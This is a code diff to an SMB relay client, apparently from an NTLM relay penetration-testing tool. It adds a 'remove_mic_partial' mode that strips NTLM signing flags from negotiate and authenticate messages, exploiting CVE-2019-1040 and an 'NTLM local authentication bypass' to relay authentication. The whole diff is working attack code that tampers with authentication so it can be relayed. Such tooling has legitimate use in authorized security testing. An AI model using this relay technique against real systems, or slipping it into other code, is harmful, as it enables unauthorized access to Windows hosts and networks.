@@ -309,7 +309,7 @@ class SMBRelayClient(ProtocolClient):
     def sendNegotiate(self, negotiateMessage):
         negoMessage = NTLMAuthNegotiate()
         negoMessage.fromString(negotiateMessage)
-        # When exploiting CVE-2019-1040, remove flags
+        # When exploiting CVE-2019-1040 or NTLM local auth bypass, remove signing flags
         if self.serverConfig.remove_mic:
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
@@ -319,6 +319,12 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+        elif self.serverConfig.remove_mic_partial:
+            # Only remove signing flags, keep KEY_EXCH and VERSION
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
 
         negotiateMessage = negoMessage.getData()
 
@@ -473,7 +479,7 @@ class SMBRelayClient(ProtocolClient):
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
 
-        # When exploiting CVE-2019-1040, remove flags
+        # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
         if self.serverConfig.remove_mic:
             authMessage = NTLMAuthChallengeResponse()
             authMessage.fromString(authenticateMessageBlob)
@@ -489,6 +495,17 @@ class SMBRelayClient(ProtocolClient):
             authMessage['MICLen'] = 0
             authMessage['Version'] = b''
             authMessage['VersionLen'] = 0
+            authenticateMessageBlob = authMessage.getData()
+        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
+        elif self.serverConfig.remove_mic_partial:
+            authMessage = NTLMAuthChallengeResponse()
+            authMessage.fromString(authenticateMessageBlob)
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            # Do NOT remove KEY_EXCH or VERSION flags
+            # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
             authenticateMessageBlob = authMessage.getData()
 
         #if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
